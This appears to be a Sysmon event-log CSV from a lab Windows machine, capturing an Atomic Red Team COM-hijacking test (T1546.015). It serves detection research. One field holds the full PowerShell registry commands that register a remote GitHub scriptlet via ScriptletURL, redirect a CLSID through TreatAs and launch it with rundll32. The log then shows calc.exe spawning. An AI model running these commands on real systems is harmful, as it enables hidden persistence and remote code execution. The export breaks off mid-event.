Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,DestinationHostname,DestinationIp,DestinationIsIpv6,DestinationPort,DestinationPortName,Details,EventID,EventRecordID,EventType,FileVersion,Hashes,Image,Initiated,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,Protocol,QueryName,QueryResults,QueryStatus,RuleName,SourceHostname,SourceIp,SourceIsIpv6,SourcePort,SourcePortName,SystemTime,TargetFilename,TargetObject,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --mojo-platform-channel-handle=4312 --field-trial-handle=2012,i,14121881332492415831,1209340753367914572,262144 --variations-seed-version /prefetch:8",Microsoft Corporation,WinDev2309Eval,,C:\Program Files (x86)\Microsoft\Edge\Application\120.0.2210.91\,Microsoft Edge,,,,,,,1,9513,,120.0.2210.91,"MD5=F6E7A024CC79AC12294D0DA6072C5073,SHA256=628792B5B5A4D71B8D66B1A1C6B775B84E3A5E64C0C05B8D7138164FBAD5C21A,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,,Low,0x8000000000000000,4,{fda94052-3502-658d-b367-080000000000},0x867b3,0,msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window /prefetch:5",C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,{fda94052-b84e-658c-0402-000000000b00},8488,WINDEV2309EVAL\User,{fda94052-cb32-658c-8402-000000000b00},7044,6964,Microsoft Edge,,,,,-,,,,,,2023-12-28T01:11:14.4458717Z,,,1,1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 01:11:14.443,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:11:14.4458717Z""/>
      <EventRecordID>9513</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:11:14.443</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb32-658c-8402-000000000b00}</Data>
      <Data Name=""ProcessId"">6964</Data>
      <Data Name=""Image"">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name=""FileVersion"">120.0.2210.91</Data>
      <Data Name=""Description"">Microsoft Edge</Data>
      <Data Name=""Product"">Microsoft Edge</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">msedge.exe</Data>
      <Data Name=""CommandLine"">""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --type=utility --utility-sub-type=unzip.mojom.Unzipper --lang=en-US --service-sandbox-type=service --mojo-platform-channel-handle=4312 --field-trial-handle=2012,i,14121881332492415831,1209340753367914572,262144 --variations-seed-version /prefetch:8</Data>
      <Data Name=""CurrentDirectory"">C:\Program Files (x86)\Microsoft\Edge\Application\120.0.2210.91\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Low</Data>
      <Data Name=""Hashes"">MD5=F6E7A024CC79AC12294D0DA6072C5073,SHA256=628792B5B5A4D71B8D66B1A1C6B775B84E3A5E64C0C05B8D7138164FBAD5C21A,IMPHASH=EA4CA1F8E3B3D9373D39C13FD1348A63</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-b84e-658c-0402-000000000b00}</Data>
      <Data Name=""ParentProcessId"">8488</Data>
      <Data Name=""ParentImage"">C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-startup-window /prefetch:5</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,5,9512,,,,C:\Users\User\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe,,,0x8000000000000000,4,,,0,,,,,,,{fda94052-caf3-658c-4a02-000000000b00},7044,5144,,,,,,-,,,,,,2023-12-28T01:11:14.0699945Z,,,5,,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 01:11:14.064,3,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>5</EventID>
      <Version>3</Version>
      <Level>4</Level>
      <Task>5</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:11:14.0699945Z""/>
      <EventRecordID>9512</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:11:14.064</Data>
      <Data Name=""ProcessGuid"">{fda94052-caf3-658c-4a02-000000000b00}</Data>
      <Data Name=""ProcessId"">5144</Data>
      <Data Name=""Image"">C:\Users\User\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,\\?\C:\Windows\System32\SecurityHealth\1.0.2306.10002-0\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Windows Security Health Host,,,,,,,1,9511,,10.0.25873.1001 (WinBuild.160101.0800),"MD5=193DC58240D8AC4EC1618FFAE14CAE71,SHA256=8D771C8A91614B85416B3EB328460E80183B38F2DC35C7A26578206AF145F419,IMPHASH=FBC9E5DE00516A75FFF7C4A11857FB1D",C:\Windows\System32\SecurityHealth\1.0.2306.10002-0\SecurityHealthHost.exe,,Medium,0x8000000000000000,4,{fda94052-3502-658d-b367-080000000000},0x867b3,0,SecurityHealthHost.exe,-,-,{00000000-0000-0000-0000-000000000000},932,-,{fda94052-cb22-658c-8202-000000000b00},7044,9428,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-28T01:10:58.4856381Z,,,1,1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 01:10:58.484,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:58.4856381Z""/>
      <EventRecordID>9511</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:10:58.484</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb22-658c-8202-000000000b00}</Data>
      <Data Name=""ProcessId"">9428</Data>
      <Data Name=""Image"">C:\Windows\System32\SecurityHealth\1.0.2306.10002-0\SecurityHealthHost.exe</Data>
      <Data Name=""FileVersion"">10.0.25873.1001 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Security Health Host</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">SecurityHealthHost.exe</Data>
      <Data Name=""CommandLine"">\\?\C:\Windows\System32\SecurityHealth\1.0.2306.10002-0\SecurityHealthHost.exe {08728914-3F57-4D52-9E31-49DAECA5A80A} -Embedding</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=193DC58240D8AC4EC1618FFAE14CAE71,SHA256=8D771C8A91614B85416B3EB328460E80183B38F2DC35C7A26578206AF145F419,IMPHASH=FBC9E5DE00516A75FFF7C4A11857FB1D</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">932</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly,Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,Host Process for Windows Tasks,,,,,,,1,9510,,10.0.22621.1635 (WinBuild.160101.0800),"MD5=4887A65FD4F6598AF4986CBC1C0E5488,SHA256=82472A84BCBB4009ADD338200F8E853FE4C5EAFE2E2C3A2D711B85BF29B72D54,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260",C:\Windows\System32\taskhostw.exe,,System,0x8000000000000000,4,{fda94052-34eb-658d-e703-000000000000},0x3e7,0,taskhostw.exe,-,-,{00000000-0000-0000-0000-000000000000},1900,-,{fda94052-cb22-658c-8102-000000000b00},7044,2676,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-28T01:10:58.4550252Z,,,1,0,6672,NT AUTHORITY\SYSTEM,S-1-5-18,2023-12-28 01:10:58.452,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:58.4550252Z""/>
      <EventRecordID>9510</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:10:58.452</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb22-658c-8102-000000000b00}</Data>
      <Data Name=""ProcessId"">2676</Data>
      <Data Name=""Image"">C:\Windows\System32\taskhostw.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1635 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Host Process for Windows Tasks</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">taskhostw.exe</Data>
      <Data Name=""CommandLine"">taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\SYSTEM</Data>
      <Data Name=""LogonGuid"">{fda94052-34eb-658d-e703-000000000000}</Data>
      <Data Name=""LogonId"">0x3e7</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=4887A65FD4F6598AF4986CBC1C0E5488,SHA256=82472A84BCBB4009ADD338200F8E853FE4C5EAFE2E2C3A2D711B85BF29B72D54,IMPHASH=1C4E2D9936E4D9F2490B08AAB4D24260</Data>
      <Data Name=""ParentProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ParentProcessId"">1900</Data>
      <Data Name=""ParentImage"">-</Data>
      <Data Name=""ParentCommandLine"">-</Data>
      <Data Name=""ParentUser"">-</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9509,,,,<unknown process>,,,0x8000000000000000,4,,,0,,,,,,,{00000000-0000-0000-0000-000000000000},7044,4428,,,raw.githubusercontent.com,::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;,0,-,,,,,,2023-12-28T01:10:57.6439152Z,,,22,,1124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 23:54:46.745,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:57.6439152Z""/>
      <EventRecordID>9509</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:46.745</Data>
      <Data Name=""ProcessGuid"">{00000000-0000-0000-0000-000000000000}</Data>
      <Data Name=""ProcessId"">4428</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.110.133;::ffff:185.199.111.133;::ffff:185.199.109.133;::ffff:185.199.108.133;</Data>
      <Data Name=""Image"">&lt;unknown process&gt;</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\System32\calc.exe"" ",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows Calculator,,,,,,,1,9508,,10.0.22621.1 (WinBuild.160101.0800),"MD5=2F82623F9523C0D167862CAD0EFF6806,SHA256=9C2C8A8588FE6DB09C09337E78437CB056CD557DB1BCF5240112CBFB7B600EFB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729",C:\Windows\System32\calc.exe,,Medium,0x8000000000000000,4,{fda94052-3502-658d-b367-080000000000},0x867b3,0,CALC.EXE,"""C:\Windows\system32\rundll32.exe"" -sta AtomicTest",C:\Windows\System32\rundll32.exe,{fda94052-cb1f-658c-7f02-000000000b00},4428,WINDEV2309EVAL\User,{fda94052-cb21-658c-8002-000000000b00},7044,5168,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-28T01:10:57.0532114Z,,,1,1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 01:10:57.051,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:57.0532114Z""/>
      <EventRecordID>9508</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:10:57.051</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb21-658c-8002-000000000b00}</Data>
      <Data Name=""ProcessId"">5168</Data>
      <Data Name=""Image"">C:\Windows\System32\calc.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows Calculator</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CALC.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\System32\calc.exe"" </Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{fda94052-3502-658d-b367-080000000000}</Data>
      <Data Name=""LogonId"">0x867b3</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=2F82623F9523C0D167862CAD0EFF6806,SHA256=9C2C8A8588FE6DB09C09337E78437CB056CD557DB1BCF5240112CBFB7B600EFB,IMPHASH=8EEAA9499666119D13B3F44ECD77A729</Data>
      <Data Name=""ParentProcessGuid"">{fda94052-cb1f-658c-7f02-000000000b00}</Data>
      <Data Name=""ParentProcessId"">4428</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\rundll32.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\system32\rundll32.exe"" -sta AtomicTest</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-28 01:10:56.937,,,,,,,,,11,9507,,,,C:\Windows\system32\rundll32.exe,,,0x8000000000000000,4,,,0,,,,,,,{fda94052-cb1f-658c-7f02-000000000b00},7044,4428,,,,,,-,,,,,,2023-12-28T01:10:56.9437593Z,C:\Users\User\AppData\Local\Microsoft\Windows\INetCache\IE\P9LEFEQ9\TreatAs[1].sct,,11,,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 01:10:56.937,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:56.9437593Z""/>
      <EventRecordID>9507</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:10:56.937</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb1f-658c-7f02-000000000b00}</Data>
      <Data Name=""ProcessId"">4428</Data>
      <Data Name=""Image"">C:\Windows\system32\rundll32.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Microsoft\Windows\INetCache\IE\P9LEFEQ9\TreatAs[1].sct</Data>
      <Data Name=""CreationUtcTime"">2023-12-28 01:10:56.937</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,lb-140-82-121-3-fra.github.com,140.82.121.3,false,443,https,,3,9506,,,,C:\Windows\system32\rundll32.exe,true,,0x8000000000000000,4,,,0,,,,,,,{fda94052-cb1f-658c-7f02-000000000b00},7044,4428,,tcp,,,,-,WinDev2309Eval.localdomain,192.168.126.164,false,59349,-,2023-12-28T01:10:56.9390125Z,,,3,,5204,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 23:54:46.013,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>3</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>3</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:56.9390125Z""/>
      <EventRecordID>9506</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""5204""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:46.013</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb1f-658c-7f02-000000000b00}</Data>
      <Data Name=""ProcessId"">4428</Data>
      <Data Name=""Image"">C:\Windows\system32\rundll32.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""Protocol"">tcp</Data>
      <Data Name=""Initiated"">true</Data>
      <Data Name=""SourceIsIpv6"">false</Data>
      <Data Name=""SourceIp"">192.168.126.164</Data>
      <Data Name=""SourceHostname"">WinDev2309Eval.localdomain</Data>
      <Data Name=""SourcePort"">59349</Data>
      <Data Name=""SourcePortName"">-</Data>
      <Data Name=""DestinationIsIpv6"">false</Data>
      <Data Name=""DestinationIp"">140.82.121.3</Data>
      <Data Name=""DestinationHostname"">lb-140-82-121-3-fra.github.com</Data>
      <Data Name=""DestinationPort"">443</Data>
      <Data Name=""DestinationPortName"">https</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,9505,,,,C:\Windows\system32\rundll32.exe,,,0x8000000000000000,4,,,0,,,,,,,{fda94052-cb1f-658c-7f02-000000000b00},7044,4428,,,github.com,::ffff:140.82.121.3;,0,-,,,,,,2023-12-28T01:10:56.6421499Z,,,22,,1124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 23:54:46.009,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:56.6421499Z""/>
      <EventRecordID>9505</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""1124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 23:54:46.009</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb1f-658c-7f02-000000000b00}</Data>
      <Data Name=""ProcessId"">4428</Data>
      <Data Name=""QueryName"">github.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:140.82.121.3;</Data>
      <Data Name=""Image"">C:\Windows\system32\rundll32.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\rundll32.exe"" -sta AtomicTest",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Windows host process (Rundll32),,,,,,,1,9504,,10.0.22621.1 (WinBuild.160101.0800),"MD5=57A6B4BDF247C1A6CA08AC09A8F9B742,SHA256=98D37EFF504A7ADB864131EA4A042AAF4D79C4356960A8AB2FA656CC59AEC014,IMPHASH=5C68DE198B5D2DD5C1129782AD19676C",C:\Windows\System32\rundll32.exe,,Medium,0x8000000000000000,4,{fda94052-3502-658d-b367-080000000000},0x867b3,0,RUNDLL32.EXE,"""powershell.exe"" & {reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest.1.00\CLSID\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /ve /T REG_SZ /d \""""C:\WINDOWS\system32\scrobj.dll\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32\"""" /v \""""ThreadingModel\"""" /T REG_SZ /d \""""Apartment\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL\"""" /ve /T REG_SZ /d \""""https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/src/TreatAs.sct\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\VersionIndependentProgID\"""" /ve /T REG_SZ /d \""""AtomicTest\"""" /f

reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\"""" /f
reg add \""""HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs\"""" /ve /T REG_SZ /d \""""{00000001-0000-0000-0000-0000FEEDACDC}\"""" /f

rundll32.exe -sta \""""AtomicTest\""""}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{fda94052-cb1e-658c-7002-000000000b00},1264,WINDEV2309EVAL\User,{fda94052-cb1f-658c-7f02-000000000b00},7044,4428,Microsoft® Windows® Operating System,,,,,-,,,,,,2023-12-28T01:10:55.5768183Z,,,1,1,6672,WINDEV2309EVAL\User,S-1-5-18,2023-12-28 01:10:55.575,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-28T01:10:55.5768183Z""/>
      <EventRecordID>9504</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""7044"" ThreadID=""6672""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-28 01:10:55.575</Data>
      <Data Name=""ProcessGuid"">{fda94052-cb1f-658c-7f02-000000000b00}</Data>
      <Data Name=""ProcessId"">4428</Data>
      <Data Name=""Image"">C:\Windows\System32\rundll32.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.1 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">Windows host process (Rundll32)</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">RUNDLL32.EXE</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\rundll32.exe"" -sta AtomicTest</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
